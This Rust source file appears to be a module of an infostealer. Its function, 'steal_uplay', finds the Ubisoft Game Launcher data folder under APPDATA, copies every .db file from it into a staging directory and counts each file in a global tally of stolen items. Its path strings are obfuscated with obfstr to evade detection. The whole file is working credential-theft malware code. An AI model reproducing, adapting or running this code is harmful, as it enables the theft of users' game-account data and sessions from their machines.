use std::fs;

pub fn steal_uplay(path: String) -> Option<String> {
    let appdata_path = std::env::var(obfstr::obfstr!("APPDATA")).unwrap();
    let ubisoft_path = format!("{appdata_path}\\{}\\{}", obfstr::obfstr!("Ubisoft Game Launcher"), obfstr::obfstr!("Uplay"));

    if std::path::Path::new(&ubisoft_path).exists() {
        let _ = fs::create_dir(format!("{path}\\{}\\", obfstr::obfstr!("Uplay")));

        for entry in fs::read_dir(ubisoft_path).unwrap() {
            let entry = entry.unwrap();
            if entry.file_name().to_str().unwrap().ends_with(".db") {
                fs::copy(entry.path(),&format!("{path}\\{}\\{name}", obfstr::obfstr!("Uplay"), name = entry.file_name().to_str().unwrap()),).ok()?;

                unsafe {
                    crate::OTHERS += 1;
                }
            }
        }
    } 
    Some("Uplay".to_string())
}
